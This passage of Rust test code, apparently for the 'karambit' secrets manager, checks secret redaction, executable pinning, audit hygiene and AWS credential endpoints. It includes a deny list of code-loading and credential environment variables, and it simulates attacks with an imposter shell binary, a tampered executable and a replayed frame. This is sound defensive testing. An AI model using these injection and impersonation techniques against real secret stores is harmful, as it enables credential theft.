  char response[8192]; size_t used=0; ssize_t got; while((got=read(fd,response+used,sizeof(response)-used-1))>0)used+=got; close(fd); response[used]=0;
  if(strncmp(response,"HTTP/1.1 200",12))return 73;
  if(!strstr(response,"AccessKeyId") || !strstr(response,"SecretAccessKey"))return 74;
  if(!strcmp(argv[1],"static") || !strcmp(argv[1],"run-sso"))puts(response);
  puts("ExpiredToken");
 }
 if(!strcmp(argv[1],"sigterm"))raise(SIGTERM);
 /* status-fd: the CLI's status descriptor (fd 4 here) must not reach the command. */
 if(!strcmp(argv[1],"status-fd") && fcntl(4,F_GETFD)!=-1) return 81;
 return 7;
}
"#).unwrap();
            assert!(Command::new("cc").arg(&source).arg("-o").arg(&target).status().unwrap().success());
            // schema-node: a real Node app that loads its own (stale, plaintext) .env with
            // dotenv. Needs KARAMBIT_TEST_NODE_APP=<dir with node_modules/dotenv>.
            let node = if mode == "schema-node" {
                let Ok(dir) = std::env::var("KARAMBIT_TEST_NODE_APP") else { eprintln!("skip schema-node: KARAMBIT_TEST_NODE_APP unset"); continue; };
                let node = std::fs::canonicalize(["/opt/homebrew/bin/node", "/usr/local/bin/node", "/usr/bin/node"].iter().find(|p| Path::new(p).exists()).expect("node")).unwrap();
                let app = f.p.root.join("app.js");
                std::fs::write(&app, format!(r#"process.chdir({root:?});
require({dotenv:?}).config({{ path: "stale.env" }});
const want = {{ X: process.env.X === "dotenv-must-lose" ? "BAD" : process.env.X, PORT: process.env.PORT, APP_URL: process.env.APP_URL, FROM_SHELL: process.env.FROM_SHELL, ONLY_IN_DOTENV: process.env.ONLY_IN_DOTENV }};
if (want.PORT !== "3000" || want.APP_URL !== "http://localhost:3000/api" || want.FROM_SHELL !== "shell-wins" || want.ONLY_IN_DOTENV !== "kept" || !want.X || want.X === "BAD") {{ console.error(JSON.stringify(want)); process.exit(90); }}
console.log(process.env.X); console.error(process.env.X);
require("fs").writeFileSync("executed", "yes");
process.exit(7);
"#, root = f.p.root.to_str().unwrap(), dotenv = format!("{dir}/node_modules/dotenv"))).unwrap();
                std::fs::write(f.p.root.join("stale.env"), "X=dotenv-must-lose
PORT=1111
ONLY_IN_DOTENV=kept
").unwrap();
                Some((node, app))
            } else { None };
            let permitted = if mode == "installed" { PathBuf::from("/usr/bin/true") } else if let Some((n, _)) = &node { n.clone() } else { target.clone() };
            for held in f.st.lock().unwrap().leases.values_mut() { held.scope.cmds = vec![CommandBinding::from(permitted.to_str().unwrap()).pin().unwrap()]; }
            if mode == "smoke" {
                // Same agent fixture and lease: legacy release fails, then the
                // production CLI below successfully spends bound authority.
                let raw = f.send(Req::Use { names: vec!["test/ref".into()], cmd: Some(permitted.to_str().unwrap().into()) }).unwrap();
                assert!(raw["deks"].as_object().unwrap().is_empty());
                assert_eq!(raw["denied"]["test/ref"], SCOPED_LEGACY_REFUSAL);
                assert!(f.send(legacy_unlock_req("test/ref", UnlockAction::Run, false)).unwrap_err().to_string().contains(SCOPED_LEGACY_REFUSAL));
                assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, 0);
            }
            let mut executable = target.clone();
            if mode == "renamed-shell" {
                let dir = f.p.root.join("imposter"); std::fs::create_dir(&dir).unwrap();
                executable = dir.join("native-cli"); std::fs::copy("/bin/sh", &executable).unwrap();
            }
            if matches!(mode,"failed-exec"|"sso-failed-exec"|"failed-exec-status") {
                std::fs::write(&target, b"this is not a native executable\n").unwrap();
                for held in f.st.lock().unwrap().leases.values_mut() { held.scope.cmds = vec![CommandBinding::from(target.to_str().unwrap()).pin().unwrap()]; }
            }
            // Daemon (this test binary) stays pinned, so the CLI accepts it; only the CLI itself is untrusted.
            if mode == "bound-refused" { std::fs::write(f.p.keys().join("daemon.sha256"), crate::platform::helper::sha256_file(&std::env::current_exe().unwrap()).unwrap()).unwrap(); }
            if matches!(mode,"default"|"aws-default") { std::fs::write(f.p.root.join(".karambit.env"), "X=test/ref\n").unwrap(); }
            if matches!(mode,"schema"|"schema-untrusted"|"schema-node") {
                // A varlock-style schema: header, decorators, plain values with ${} expansion,
                // quotes, multi-line, an optional unset item, and one karambit() secret.
                std::fs::write(f.p.root.join(".env.schema"), concat!(
                    "# Synthetic schema\n# @defaultRequired=false\n# ---\n",
                    "# @type=port\nPORT=3000\n",
                    "APP_URL=http://localhost:${PORT}/api\n",
                    "FROM_SHELL=from-schema\n",
                    "QUOTED=\"a #b\" # trailing comment\n",
                    "UNSET_OPTIONAL=\n",
                    "MULTI=\"\"\"line1\nline2\"\"\"\n",
                    "# @sensitive @docs(https://example.invalid/keys)\nX=karambit(test/ref)\n")).unwrap();
            }
            if mode == "file-order" { std::fs::write(f.p.root.join("explicit.env"), "X=test/nonexistent\n").unwrap(); }
            if matches!(mode, "default" | "aws-default" | "file-order" | "schema" | "schema-node") {
                let path = f.p.root.join(match mode { "file-order" => "explicit.env", "schema" | "schema-node" => ".env.schema", _ => ".karambit.env" });
                crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| Ok(()))));
                let human = agent::Peer { pid: f.peer.pid, caller: Default::default(), ..Default::default() };
                handle_as(&f.p, &f.st, human, Req::ProfileTrust { path: path.to_str().unwrap().into() }, 0, None, Ok).unwrap();
                crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = None);
            }
            if mode == "invalid-env-sso" {
                let v = peer_vault(&f.p, &f.peer).unwrap(); let dek = crate::crypto::new_dek();
                let file = v.build_file("test/invalid", store::Tier::Open, true, false, &dek, &[0xff], &v.pubkeys_local().unwrap(), None).unwrap();
                store::save_secret(&f.p, &file).unwrap();
            }
            store::ensure_dir(&run_dir(&f.p)).unwrap();
            let listener = UnixListener::bind(sock_path(&f.p)).unwrap(); listener.set_nonblocking(true).unwrap();
            let http = std::net::TcpListener::bind("127.0.0.1:0").unwrap(); http.set_nonblocking(true).unwrap();
            let port = http.local_addr().unwrap().port();
            let done = Arc::new(AtomicBool::new(false)); let stop = done.clone(); let p = f.p.clone(); let st = f.st.clone();
            let http_thread = std::thread::spawn(move || {
                while !stop.load(Ordering::SeqCst) {
                    match http.accept() {
                        Ok((stream,_)) => { stream.set_nonblocking(false).unwrap(); serve_aws(stream, &st, &p).unwrap(); }
                        Err(e) if e.kind()==std::io::ErrorKind::WouldBlock => std::thread::sleep(Duration::from_millis(5)),
                        Err(e) => panic!("{e}"),
                    }
                }
            });
            let requests = Arc::new(Mutex::new(Vec::<&'static str>::new()));
            let proofs = Arc::new(AtomicUsize::new(0)); let replayed = Arc::new(AtomicBool::new(false));
            let deliveries = Arc::new(AtomicUsize::new(0)); let delivered = deliveries.clone();
            let stop = done.clone(); let p = f.p.clone(); let st = f.st.clone(); let seen = requests.clone();
            let proof_count = proofs.clone(); let replay_count = replayed.clone(); let base = f.sso_base.clone(); let replacement = target.clone();
            let server = std::thread::spawn(move || {
                let mut handlers = vec![];
                while !stop.load(Ordering::SeqCst) {
                    match listener.accept() {
                        Ok((c,_)) => {
                            let p=p.clone(); let st=st.clone(); let seen=seen.clone(); let proofs=proof_count.clone();
                            let replayed=replay_count.clone(); let base=base.clone(); let replacement=replacement.clone(); let delivered=delivered.clone();
                            handlers.push(std::thread::spawn(move || {
                                c.set_nonblocking(false).unwrap();
                                crate::sso::TEST_BASE.with(|b| *b.borrow_mut() = base);
                                install_launch_unwrap(st.clone(), p.clone(), None);
                                let observations=seen.clone();
                                CLI_REQUEST_OBSERVER.with(|h| *h.borrow_mut()=Some(Box::new(move |req| {
                                    let name=match req { Req::Unlock{..}=>"unlock", Req::AwsOpen{..}=>"aws_open", Req::SsoOpen{..}=>"sso_open",
                                        Req::LaunchPrepare{..}=>"prepare", Req::LaunchRedaction{..}=>"redaction", Req::RunUnredacted{..}=>"unredacted", _=>"other" };
                                    observations.lock().unwrap().push(name);
                                    assert!(!matches!(name,"unlock"|"aws_open"|"sso_open"), "production run used legacy release");
                                })));
                                let auth_p=p.clone(); let auth_st=st.clone();
                                crate::platform::helper::CALL_AT_HOOK.with(|h| *h.borrow_mut()=Some(Box::new(move |_,args| {
                                    assert_eq!(mode,"no-redact"); assert_eq!(args[0],"auth"); assert!(auth_st.try_lock().is_ok());
                                    let wire: Value=serde_json::from_str(args[2]).unwrap(); assert_eq!(wire["id"],"run_unredacted");
                                    assert_eq!(wire["params"],json!([auth_p.root.join("native-cli")]));
                                    let records=crate::audit::read(&auth_p,usize::MAX).unwrap();
                                    assert!(!records.iter().any(|r|r["action"]=="launch-prepare"));
                                    assert!(records.iter().any(|r|r["action"]=="daemon-run-unredacted" && r["phase"]=="intent"));
                                    proofs.fetch_add(1,Ordering::SeqCst); Ok(json!({}))
                                })));
                                if mode=="changed" {
                                    LAUNCH_BIND_HOOK.with(|h| *h.borrow_mut()=Some(Box::new(move |stage| {
                                        if stage=="redeem-verify" { std::fs::OpenOptions::new().append(true).open(&replacement)?.write_all(b"changed")?; }
                                        Ok(())
                                    })));
                                }
                                {
                                    let socket=sock_path(&p);
                                    CLI_REDEEM_OBSERVER.with(|h| *h.borrow_mut()=Some(Box::new(move |frame| {
                                        delivered.fetch_add(1,Ordering::SeqCst);
                                        if mode!="replay" { return; }
                                        let mut child=Command::new(std::env::current_exe().unwrap())
                                            .args(["--exact","daemon::launch_prepare_tests::cli_replay_child"])
                                            .env("KARAMBIT_TEST_REPLAY_SOCKET",socket).stdin(Stdio::piped()).stdout(Stdio::null()).spawn().unwrap();
                                        child.stdin.take().unwrap().write_all(frame).unwrap();
                                        assert!(child.wait().unwrap().success()); replayed.store(true,Ordering::SeqCst);
                                    })));
                                }
                                serve_connection(p,st,c,unsafe {libc::getuid()},port);
                            }));
                        }
                        Err(e) if e.kind()==std::io::ErrorKind::WouldBlock => std::thread::sleep(Duration::from_millis(5)),
                        Err(e)=>panic!("{e}"),
                    }
                }
                for h in handlers { h.join().unwrap(); }
            });
            let mut command=Command::new(&cli);
            command.env_clear().env("KARAMBIT_DIR",&f.p.root).env("PATH",&f.p.root).env("HOME",&f.p.root).env("KARAMBIT_DEV","1")
                .current_dir(&f.p.root).stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::piped());
            if aws && !matches!(mode,"invalid-env-sso"|"run-static"|"run-sso") { command.args(["aws",if mode=="static-prefixed" {"aws/static"} else {"static"},"--region","eu-west-2"]); }
            else {
                command.arg("run");
                if mode=="missing-profile" { command.args(["--aws","missing"]); }
                else if matches!(mode,"run-static"|"run-sso") { command.args(["--aws","static","-e","X=test/ref"]); }
                else if mode=="default-var" { command.args(["-e","test/ref"]); }
                else if mode=="invalid-env-sso" { command.args(["--aws","static","-e","X=test/invalid"]); }
                else if !matches!(mode,"default"|"no-secrets"|"schema"|"schema-untrusted"|"schema-node") { command.args(["-e","X=test/ref"]); }
                if matches!(mode,"schema"|"schema-untrusted"|"schema-node") { command.env("FROM_SHELL","shell-wins"); }
                if mode=="file-order" { command.args(["--env-file","explicit.env"]); }
                if matches!(mode,"no-redact"|"agent-no-redact") { command.arg("--no-redact"); }
                if matches!(mode,"status-fd"|"failed-exec-status"|"too-large") { command.args(["--status-fd","4"]); }
            }
            if mode!="missing-command" {
                command.arg("--");
                if mode=="shell" { command.args(["/bin/sh","-c","printf %s \"$X\""]); }
                else if mode=="installed" { command.arg("/usr/bin/true"); }
                else if mode=="schema-node" { command.args([node.as_ref().unwrap().0.to_str().unwrap(), node.as_ref().unwrap().1.to_str().unwrap()]); }
                else { command.arg(if mode=="bare" { Path::new("native-cli") } else { &executable }).arg(mode); }
            }
            // status-fd: a pipe on fd 4 that only the CLI may write.
            let mut status_pipe=[0;2];
            if matches!(mode,"status-fd"|"failed-exec-status"|"too-large") {
                assert_eq!(unsafe { libc::pipe(status_pipe.as_mut_ptr()) },0);
                let w=status_pipe[1];
                unsafe { std::os::unix::process::CommandExt::pre_exec(&mut command, move || {
                    if libc::dup2(w,4)<0 { return Err(std::io::Error::last_os_error()); } Ok(())
                }); }
            }
            let mut child=command.spawn().unwrap(); let deadline=Instant::now()+WAIT;
            if matches!(mode,"status-fd"|"failed-exec-status"|"too-large") { unsafe { libc::close(status_pipe[1]); } }
            while child.try_wait().unwrap().is_none() {
                if Instant::now()>=deadline { child.kill().unwrap(); panic!("production CLI timeout: {mode}"); }
                std::thread::sleep(Duration::from_millis(10));
            }
            let output=child.wait_with_output().unwrap();
            if mode=="status-fd" {
                let mut line=String::new();
                std::io::Read::read_to_string(&mut unsafe { <std::fs::File as std::os::fd::FromRawFd>::from_raw_fd(status_pipe[0]) },&mut line).unwrap();
                assert_eq!(line,"{\"exit\":7,\"started\":true,\"v\":1}\n","status line");
            }
            if mode=="too-large" {
                // Refused at prepare: started:false, and the message says what to change.
                let mut line=String::new();
                std::io::Read::read_to_string(&mut unsafe { <std::fs::File as std::os::fd::FromRawFd>::from_raw_fd(status_pipe[0]) },&mut line).unwrap();
                let status:Value=serde_json::from_str(&line).unwrap();
                assert_eq!(status["started"],false,"{line}");
                assert!(status["error"]["message"].as_str().unwrap().contains(LAUNCH_TOO_LARGE),"{line}");
            }
            if mode=="failed-exec-status" {
                // The shim failed at execve: the program never ran, so retry logic must see started:false.
                let mut line=String::new();
                std::io::Read::read_to_string(&mut unsafe { <std::fs::File as std::os::fd::FromRawFd>::from_raw_fd(status_pipe[0]) },&mut line).unwrap();
                let status:Value=serde_json::from_str(&line).unwrap();
                assert_eq!(status["started"],false,"{line}");
                assert_eq!(status["error"]["code"],"launch_failed","{line}");
                assert!(status.get("exit").is_none(),"{line}");
            }
            // Allow endpoint EOF handlers to finish and observe any late replay requests.
            let until=Instant::now()+WAIT;
            while mode=="replay" && !replayed.load(Ordering::SeqCst) { assert!(Instant::now()<until); std::thread::sleep(Duration::from_millis(5)); }
            done.store(true,Ordering::SeqCst); server.join().unwrap(); http_thread.join().unwrap();
            let stderr=String::from_utf8_lossy(&output.stderr);
            let failed=matches!(mode,"static-prefixed"|"agent-no-redact"|"no-secrets"|"missing-profile"|"missing-command"|"renamed-shell"|"changed"|"bound-refused"|"invalid-env-sso"|"schema-untrusted"|"too-large");
            if mode=="schema-untrusted" { assert!(stderr.contains("profile.untrusted"),"{stderr}"); }
            if failed { assert!(!output.status.success(),"{mode}"); assert!(!f.p.root.join("executed").exists(),"{mode}"); }
            else { assert_eq!(output.status.code(),Some(match mode {"sigterm"=>143,"shell"|"installed"=>0,"failed-exec"|"sso-failed-exec"|"failed-exec-status"=>125,_=>7}),"{mode}: {stderr}"); }
            if matches!(mode,"failed-exec"|"sso-failed-exec"|"failed-exec-status") { assert!(stderr.contains("the program did not start"),"{mode}: {stderr}"); }
            // Pre-launch failures: exit 125 with the reason and a `next:` step (agent-mode contract).
            if mode=="no-secrets" { assert_eq!(stderr,"karambit: no secrets requested (use -e VAR=ns/name, a .karambit.env or a .env.schema file)\n  next: fix the command line; see `karambit run --help`\n"); assert_eq!(output.status.code(),Some(125)); }
            if mode=="missing-profile" { assert_eq!(stderr,"karambit: no AWS profile \"missing\" (see `karambit aws ls`)\n  next: check the name with `karambit aws ls`\n"); assert_eq!(output.status.code(),Some(125)); }
            if mode=="missing-command" { assert_eq!(output.status.code(),Some(125)); }
            if mode=="too-large" { assert_eq!(output.status.code(),Some(125)); assert!(stderr.contains(LAUNCH_TOO_LARGE) && stderr.contains("nothing was prompted or used"),"{stderr}"); }
            if mode=="missing-command" { assert!(stderr.contains("the following required arguments were not provided") && stderr.contains("Usage:")); }
            if matches!(mode,"smoke"|"bare"|"default"|"file-order"|"shell"|"replay"|"default-var"|"aws-default"|"run-static"|"run-sso"|"schema"|"schema-node"|"status-fd") {
                assert!(String::from_utf8_lossy(&output.stdout).contains("[REDACTED:test/ref]"),"{mode}: {stderr}");
                assert!(!output.stdout.windows(test_value().len()).any(|w|w==test_value().as_slice()));
            }
            if mode=="public" { assert!(output.stdout.windows(test_value().len()).any(|w|w==test_value().as_slice())); }
            if mode=="no-redact" { assert_eq!(proofs.load(Ordering::SeqCst),1); assert!(output.stdout.windows(test_value().len()).any(|w|w==test_value().as_slice())); }
            if matches!(mode,"static"|"run-static"|"aws-default") {
                let label="static";
                assert!(stderr.ends_with(&format!("karambit: AWS profile {label:?} has expired. Get fresh credentials from the AWS console and run:\n  karambit aws add {label} --force\n")));
            }
            if mode=="static" {
                assert!(!output.stdout.windows(creds.secret_access_key.len()).any(|w|w==creds.secret_access_key.as_bytes()));
                assert!(String::from_utf8_lossy(&output.stdout).contains("[REDACTED:aws/static:secret-access-key]"));
            }
            if mode=="static-prefixed" { assert_eq!(stderr,"karambit: invalid profile name \"aws/static\": use [A-Za-z0-9._-]\n  next: fix the command line; see `karambit run --help`\n"); assert_eq!(output.status.code(),Some(125)); }
            if sso { assert!(!stderr.contains("has expired")); }
            if mode=="run-sso" {
                // Role credentials minted mid-run are redacted by the owner before the target gets them.
                let out=String::from_utf8_lossy(&output.stdout);
                assert!(!out.contains("ASIAFAKEFAKEFAKE") && out.contains("[REDACTED:aws/static:access-key-id]"),"{out}");
            }
            assert!(f.st.lock().unwrap().aws.is_empty(),"endpoint leaked: {mode}");
            let seen=requests.lock().unwrap(); assert!(!seen.iter().any(|n|matches!(*n,"unlock"|"aws_open"|"sso_open")),"{mode}");
            if matches!(mode,"no-redact"|"agent-no-redact") { assert!(!seen.contains(&"redaction")); }
            if mode=="agent-no-redact" { assert!(!seen.contains(&"prepare") && !seen.contains(&"unredacted")); }
            if mode=="bound-refused" { assert!(seen.contains(&"prepare")); assert!(stderr.contains("isn't the trusted one"),"{stderr}"); assert_eq!(output.status.code(),Some(125)); }
            if mode=="changed" { assert!(!seen.contains(&"redaction")); }
            if matches!(mode,"changed"|"renamed-shell"|"bound-refused"|"invalid-env-sso"|"too-large") {
                assert_eq!(deliveries.load(Ordering::SeqCst),0,"bundle released: {mode}");
            }
            if matches!(mode,"failed-exec"|"sso-failed-exec"|"failed-exec-status") {
                assert!(!f.p.root.join("executed").exists());
                assert_eq!(deliveries.load(Ordering::SeqCst),1,"failed-exec must exercise issued endpoint cleanup");
            }
            let records=if f.p.audit().exists() { f.records() } else { vec![] };
            if mode!="missing-command" { assert!(records.iter().any(|r|r["action"]=="run-child" && r["phase"]=="intent")); }
            if !failed && !matches!(mode,"failed-exec"|"sso-failed-exec"|"failed-exec-status") {
                let prepare=records.iter().find(|r|r["action"]=="launch-prepare" && r["phase"]=="intent").unwrap();
                assert!(prepare["detail"]["target"]["sha256"].as_str().is_some_and(|s|s.len()==64));
                if mode=="bare" { assert_eq!(prepare["detail"]["argv"][0],"native-cli"); }
            }
            let audit=std::fs::read(f.p.audit()).unwrap_or_default();
            for secret in [test_value().to_vec(),creds.secret_access_key.as_bytes().to_vec()] { assert!(!audit.windows(secret.len()).any(|w|w==secret)); }
        }
    }

    // Synthetic terminal ancestry only: kernel owner/shim identities and socket
    // dispatch remain real. No GUI/terminal executable is launched by tests.
    fn set_test_anchor(peer: &mut agent::Peer) {
        peer.anchor = Some((10, 20));
        peer.ancestors.push((10, 20));
    }

    #[test]
    fn redaction_sibling_child() {
        let Ok(socket)=std::env::var("KARAMBIT_TEST_REDACTION_SOCKET") else { return };
        let id=std::env::var("KARAMBIT_TEST_REDACTION_ID").unwrap();
        let mut c=UnixStream::connect(socket).unwrap();
        writeln!(c,"{}",json!({"op":"launch_redaction","id":id})).unwrap();
        let mut line=String::new(); BufReader::new(c).read_line(&mut line).unwrap();
        assert_eq!(serde_json::from_str::<Value>(&line).unwrap(),json!({"error":"launch refused"}));
    }

    #[test]
    fn bound_owner_child() {
        let Ok(root) = std::env::var("KARAMBIT_TEST_OWNER_ROOT") else { return };
        let p = Paths { root: root.into() };
        let mode = std::env::var("KARAMBIT_TEST_OWNER_MODE").unwrap();
        if mode == "signals" { unsafe { libc::signal(libc::SIGINT, libc::SIG_IGN); } }
        let cfg = store::load_config(&p).unwrap();
        let peer = agent::detect_peer(&cfg, std::process::id() as i32);
        let v = peer_vault(&p, &peer).unwrap();
        let argv = if mode == "ambient-env" { vec!["native-redaction".into(), p.root.join("ready").to_str().unwrap().into(), p.root.join("release").to_str().unwrap().into(), mode.clone()] }
            else if mode=="audit-script" { vec![p.root.join("native-redaction").to_str().unwrap().into(),p.root.join("script-link").to_str().unwrap().into()] }
            else { vec![p.root.join("native-redaction").to_str().unwrap().into(), p.root.join("ready").to_str().unwrap().into(), p.root.join("release").to_str().unwrap().into(), mode.clone()] };
        let mut assignments = vec![("VALUE".into(), "test/overwritten".into()), ("VALUE".into(), "test/overwritten-again".into()),
            ("VALUE".into(), "test/ref".into()), ("PUBLIC".into(), "test/public".into())];
        if mode != "ambient-env" { assignments.push(("VAULT_TOKEN".into(), "test/public".into())); }
        // Plain schema values: a new name is added; one that collides with a secret
        // assignment loses to the secret (ambient never overrides an injected value).
        let plain = if mode == "ambient-env" { vec![("SCHEMA_PLAIN".into(), "from-schema".into()), ("VALUE".into(), "plain-must-lose".into())] } else { vec![] };
        if mode == "ambient-env" {
            for bad in ["VAULT_TOKEN", "AWS_SECRET_ACCESS_KEY", "OP_SESSION_x", "KARAMBIT_X", "NODE_OPTIONS", "DYLD_INSERT_LIBRARIES", "PYTHONPATH"] {
                let refused = v.launch_bound_with_plain(vec![], vec![(bad.into(), "x".into())], vec!["/usr/bin/true".into()], std::fs::canonicalize(&p.root).unwrap(), None, None, (false, None));
                assert!(refused.unwrap_err().to_string().contains("can't be a plain value"), "{bad}");
            }
        }
        let result = v.launch_bound_with_plain(assignments, plain,
            argv, std::fs::canonicalize(&p.root).unwrap(), (mode != "ambient-env").then(|| "aws/static".into()), None, (matches!(mode.as_str(), "agent-unredacted" | "unredacted" | "unredacted-deny"), None));
        if matches!(mode.as_str(), "ok" | "signals" | "unredacted" | "audit-script" | "ambient-env") { assert_eq!(result.unwrap().code(), Some(23)); }
        else { assert!(result.is_err()); }
    }

    #[test]
    fn redaction_refuses_stale_socket_incarnation() {
        // A live process whose current pidversion differs from the socket's
        // recorded one (pid reuse / retained old socket) is refused before any
        // registry lookup or audit.
        let me = std::process::id() as i32;
        let version = live_pidversion(me).unwrap();
        let f = Fixture::redeem();
        let (mut a, _b) = UnixStream::pair().unwrap();
        let result = release_launch_redaction(&f.p, &f.st, me, version.wrapping_add(1), "synthetic", &mut a);
        assert!(result.is_err());
        assert!(!f.p.audit().exists() || !f.records().iter().any(|r| r["action"] == "launch-redaction"));
        // A dead pid has no task: fails closed.
        let mut child = std::process::Command::new("/usr/bin/true").spawn().unwrap();
        let dead = child.id() as i32; child.wait().unwrap();
        assert!(live_pidversion(dead).is_err());
        // The socket token and the task token agree for a live peer.
        let (x, _y) = UnixStream::pair().unwrap();
        assert_eq!(peer_token_of(&x, unsafe { libc::getuid() }).unwrap(), (me, version));
    }

    #[test]
    fn bound_owner_redaction_go_audit_and_signal_groups() {
        use std::os::unix::process::CommandExt;
        for mode in ["ok", "intent", "cancel", "revoke", "expiry", "shim-death", "stale-version", "signals", "agent-unredacted", "unredacted", "unredacted-deny", "audit-script", "ambient-env"] {
            let creds = static_test_creds();
            let (f, _) = aws_fixture(&creds.to_json().unwrap());
            // Add synthetic private and public entries; only private has a lease.
            let v = peer_vault(&f.p, &f.peer).unwrap();
            for (name, public, value) in [("test/ref", false, test_value()), ("test/public", true, Zeroizing::new(b"public-output-intact".to_vec()))] {
                let dek = crate::crypto::new_dek();
                let file = v.build_file(name, store::Tier::Open, !public, public, &dek, &value, &v.pubkeys_local().unwrap(), None).unwrap();
                store::save_secret(&f.p, &file).unwrap();
            }
            if mode == "ambient-env" {
                // The owner is an agent here (its parent is the configured test binary).
                let mut cfg = store::load_config(&f.p).unwrap();
                cfg.allow_env = vec!["RUBYOPT".into()];
                store::save_config(&f.p, &cfg).unwrap();
            }
            if mode.starts_with("unredacted") {
                let mut cfg=store::Config::default(); cfg.agent_process_names.clear(); cfg.agent_env_markers.clear();
                cfg.removed_defaults=store::DEFAULT_AGENT_PROCESS_NAMES.iter().chain(store::DEFAULT_AGENT_ENV_MARKERS).map(|s|(*s).into()).collect();
                store::save_config(&f.p,&cfg).unwrap();
                let dek=f.st.lock().unwrap().leases["aws/static"].dek.clone();
                let file=v.build_file("aws/static",store::Tier::Open,true,false,&dek,&creds.to_json().unwrap(),&v.pubkeys_local().unwrap(),None).unwrap();
                store::save_secret(&f.p,&file).unwrap();
            }
            let target = f.p.root.join("native-redaction");
            let source = f.p.root.join("native-redaction.c");
            let code = r#"#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
static volatile sig_atomic_t ints, terms;
static void count(int s) { if(s==SIGINT) ints++; if(s==SIGTERM) terms++; }
static void emit(int fd,const char *s) { for(size_t i=0;i<strlen(s);i+=3) { size_t n=strlen(s+i); if(n>3)n=3; write(fd,s+i,n); usleep(100); } write(fd,"\n",1); }
int main(int argc,char **argv) {
 if(argc==2) return 23; signal(SIGINT,count); signal(SIGTERM,count);
 if(!getenv("FOO") || strcmp(getenv("FOO"),"bar")) return 41;
 if(!getenv("LANG") || strcmp(getenv("LANG"),"C")) return 42;
 if(getenv("AWS_SECRET_ACCESS_KEY") || getenv("OP_SESSION_abc") || getenv("ALL_PROXY")) return 43;
 if(!getenv("VALUE") || !strcmp(getenv("VALUE"),"ambient")) return 44;
 if(!strcmp(argv[3],"ambient-env")) { if(getenv("VAULT_TOKEN")) return 45; }
 else if(!getenv("VAULT_TOKEN") || strcmp(getenv("VAULT_TOKEN"),"public-output-intact")) return 45;
 if(!getenv("KARAMBIT_INJECTED") || strcmp(getenv("KARAMBIT_INJECTED"),"1")) return 46;
 extern char **environ;
 for(char **e=environ;*e;e++) if(!strncmp(*e,"KARAMBIT_",9) && strncmp(*e,"KARAMBIT_INJECTED=",18)) return 47;
 if(strcmp(argv[3],"ambient-env")) {
   if(getenv("AWS_PROFILE") || getenv("AWS_DEFAULT_PROFILE") || getenv("AWS_ROLE_ARN")) return 48;
   if(!getenv("AWS_REGION") || strcmp(getenv("AWS_REGION"),"us-east-1")) return 49;
   if(!getenv("AWS_DEFAULT_REGION") || strcmp(getenv("AWS_DEFAULT_REGION"),"us-east-1")) return 49;
   if(!getenv("AWS_CONTAINER_CREDENTIALS_FULL_URI") || !strcmp(getenv("AWS_CONTAINER_CREDENTIALS_FULL_URI"),"ambient-uri")) return 50;
 }
 if(!strcmp(argv[3],"ambient-env")) {
   if(strcmp(argv[0],"native-redaction")) return 51;
   if(!getenv("SCHEMA_PLAIN") || strcmp(getenv("SCHEMA_PLAIN"),"from-schema")) return 52;
   if(!strcmp(getenv("VALUE"),"plain-must-lose")) return 53;
   if(getenv("PYTHONPATH") || getenv("NODE_OPTIONS")) return 54; /* agent caller: code-loading ambient dropped */
   if(!getenv("RUBYOPT") || strcmp(getenv("RUBYOPT"),"ambient")) return 55; /* allow_env lets it through */
   return 23;
 }
 FILE *f=fopen(argv[1],"w"); fprintf(f,"%d %d %d\n",getpid(),getppid(),getpgrp()); fclose(f);
 if(!strcmp(argv[3],"signals")) {
   /* Forwarded signals arrive asynchronously: wait for all three, plus release, then a settle
      period so a duplicated forward would still be counted. Bounded so a lost signal fails. */
   for(int i=0;(access(argv[2],F_OK) || ints<2 || terms<1) && i<6000;i++) usleep(10000);
   usleep(300000); printf("counts:%d:%d\n",ints,terms); return 23; }
 for(int fd=1;fd<=2;fd++) { emit(fd,getenv("VALUE")); emit(fd,"STATIC_KEY"); emit(fd,getenv("AWS_CONTAINER_AUTHORIZATION_TOKEN")); emit(fd,getenv("PUBLIC")); }
 return 23;
}
"#.replace("STATIC_KEY", &creds.secret_access_key);
            std::fs::write(&source, code).unwrap();
            assert!(std::process::Command::new("cc").arg(&source).arg("-o").arg(&target).status().unwrap().success());
            std::fs::write(f.p.root.join("script.sh"),b"exit 23\n").unwrap();
            std::os::unix::fs::symlink("script.sh",f.p.root.join("script-link")).unwrap();
            f.st.lock().unwrap().leases.get_mut("aws/static").unwrap().scope.cmds = vec![CommandBinding::from(target.to_str().unwrap()).pin().unwrap()];
            store::ensure_dir(&run_dir(&f.p)).unwrap();
            if mode=="ok" { std::fs::write(run_dir(&f.p).join("redaction-probe"),b"").unwrap(); }
            if mode=="stale-version" { std::fs::write(run_dir(&f.p).join("stale-version"),b"").unwrap(); }
            let listener = UnixListener::bind(sock_path(&f.p)).unwrap(); listener.set_nonblocking(true).unwrap();
            let done = Arc::new(std::sync::atomic::AtomicBool::new(false));
            let stop = done.clone(); let p = f.p.clone(); let st = f.st.clone();
            let server = std::thread::spawn(move || {
                let mut handlers = Vec::new();
                while !stop.load(std::sync::atomic::Ordering::SeqCst) {
                    match listener.accept() {
                        Ok((c,_)) => {
                            let p=p.clone(); let st=st.clone();
                            handlers.push(std::thread::spawn(move || {
                                c.set_nonblocking(false).unwrap();
                                install_launch_unwrap(st.clone(), p.clone(), None);
                                let auth_p=p.clone(); let auth_st=st.clone();
                                crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut()=Some(Box::new(move || {
                                    assert!(mode.starts_with("unredacted"));
                                    assert!(auth_st.try_lock().is_ok());
                                    let records=crate::audit::read(&auth_p,usize::MAX).unwrap();
                                    assert!(records.iter().any(|r|r["action"]=="daemon-run-unredacted" && r["phase"]=="intent"));
                                    assert!(!records.iter().any(|r|r["action"]=="launch-prepare"));
                                    if mode=="unredacted-deny" { bail!("synthetic denial"); }
                                    std::fs::write(auth_p.root.join("proof"),b"typed").unwrap();
                                    Ok(())
                                })));
                                let hook_st=st.clone(); let hook_p=p.clone();
                                LAUNCH_BIND_HOOK.with(|h| *h.borrow_mut()=Some(Box::new(move |stage| {
                                    assert!(hook_st.try_lock().is_ok());
                                    if stage == "redaction-audit" && mode == "intent" { crate::audit::fail_phase(Some("intent")); }
                                    if stage == "redaction-take" {
